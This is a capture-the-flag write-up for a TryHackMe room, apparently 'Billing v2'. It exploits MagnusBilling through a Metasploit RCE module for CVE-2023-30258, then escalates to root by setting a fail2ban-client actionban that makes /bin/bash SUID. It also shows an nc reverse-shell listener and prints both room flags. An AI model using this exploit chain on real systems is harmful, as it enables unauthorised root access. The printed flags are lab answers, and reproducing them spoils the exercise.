# Billing v2


- 16 mar | grayshader


***using metasploit module :::***
https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/

```
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```
user flag location: /home/magnus/user.txt

**user_flag**

THM{4a6831d5f124b25eefb1e92e0f0da4ca}


***Privesc to Root***

found : (ALL) NOPASSWD: /usr/bin/fail2ban-client

fail2ban : utility Fail2Ban v0.11.2 reads log file that contains password failure report
and bans the corresponding IP addresses using firewall rules.

version is 
	sudo fail2ban-client version
			0.11.2

sudo fail2ban-client status
	Status
	|- Number of jail:      8
	`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd

for reference
	[asterisk-iptables]   
	enabled  = true           
	filter   = asterisk       
	action   = iptables-allports[name=ASTERISK, port=all, protocol=all]   
	logpath  = /var/log/asterisk/messages 
	maxretry = 5  
	bantime = 600

actionban is run command after ban is activite.
now we can change actionban to
```
sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
```
add suid bit to /bin/bash	

ban a ip manually
suid bit added to bash

bash -p

our effective id is root 
 euid=0(root) egid=0(root) groups=0(root)

 
***root_flag***
 THM{33ad5b530e71a172648f424ec23fae60}



**references**

https://infosecwriteups.com/billing-tryhackme-writeup-aa32f343b0f1
https://www.linode.com/docs/guides/using-fail2ban-to-secure-your-server-a-tutorial/
https://www.revshells.com/  // used for shell stability   

```
rlwrap -f . -r nc -lvnp 1234
```
